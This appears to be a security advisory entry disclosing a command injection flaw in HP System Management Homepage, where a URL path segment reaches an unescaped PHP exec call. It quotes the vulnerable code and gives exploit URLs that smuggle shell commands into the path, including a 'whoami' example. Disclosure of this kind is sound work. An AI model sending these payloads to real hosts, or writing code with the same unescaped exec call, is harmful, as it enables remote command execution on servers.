  "Description": "Markus Wulftange from Daimler TSS reports: The vulnerability is located in the `ginkgosnmp.inc` PHP file in the `C:\\hp\\hpsmh\\data\\smhutil` or  `/opt/hp/hpsmh/data/smhutil` directory, respectively. Inside the `ginkgosnmp.inc` script, the last path segment of the current requested URL path is used in a `exec` call without proper escaping: $tempfilename = \"$sessiondir/\" . substr($_SERVER[\"SCRIPT_URL\"], 1 + strrpos($_SERVER[\"SCRIPT_URL\"], '/')) . uniqid(\".\", true) . time() . \".txt\"; if(\"Linux\" == PHP_OS)\n$cmd = \"../../webapp-data/webagent/csginkgo -f$tempfilename\"; else $windrive = substr( $_SERVER[\"WINDIR\"], 0, 2 ); $cmd = \"$windrive\\\\hp\\\\hpsmh\\\\data\\\\smhutil\\\\csginkgo.exe -f$tempfilename\"; exec( $cmd, $out ); This script is reachable via the URL path `https://<host>:2381/smhutil/snmpchp.php.en`. Due to [Apache\u2019s *MultiViews*] [2] it can also be referenced with any additional path segments after the `snmpchp.php.en` segment: `https://<host>:2381/smhutil/snmpchp.php.en/foo/bar` still triggers `https://<host>:2381/smhutil/snmpchp.php.en` but `$_SERVER[\"SCRIPT_URL\"]` is `https://<host>:2381/smhutil/snmpchp.php.en/foo/bar`. This can be exploited as follows: https://<host>:2381/smhutil/snmpchp.php.en/&&<cmd>&&echo (full file name)\nhttps://<host>:2381/smhutil/snmpchp.php/&&<cmd>&&echo    (without \"en\" language indicator)\nhttps://<host>:2381/smhutil/snmpchp/&&<cmd>&&echo        (without any file name extension) Besides the path segment separator `/`, the characters `<`, `>`, and `|` are also not allowed, which makes exploiting this vulnerability a little hard. https://<host>:2381/smhutil/snmpchp/&&whoami&&echo",
